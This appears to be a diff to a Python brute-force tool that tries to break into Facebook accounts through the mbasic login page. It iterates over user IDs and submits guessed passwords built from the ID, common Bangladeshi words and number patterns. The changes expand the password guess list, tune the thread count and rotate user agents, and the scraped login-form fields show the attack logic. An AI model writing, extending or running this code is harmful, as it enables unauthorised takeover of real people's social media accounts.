@@ -584,7 +584,7 @@ def ran():
     else:
         fb = "mbasic"
 
-    with ThreadPool(max_workers=55) as heron:
+    with ThreadPool(max_workers=33) as heron:
         sort.clear()
         sort.logo()
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
@@ -599,7 +599,7 @@ def ran():
                 pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[2:]]
             else:
                 pwx = [uid, uid[:6], uid[:8], xd[4:], xd[2:], "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####",
-                       "১২৩৪৫৬"]
+                       "১২৩৪৫৬", "jannat", "987654", "Bangladesh", "iloveyou", "৬৫৪৩২১", "654321", "sadiya", "203040", "708090", "77889900"]
             heron.submit(ren_sub, uid, pwx, meth, user, fb)
 
 
@@ -619,7 +619,7 @@ def ren_sub(uid, pwx, meth, user, fb):
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = Samsung()
+            uax = ua()
             ver1 = str(random.randrange(1, 99))
             ver2 = str(random.randrange(90, 121))
             lsd = lsb()
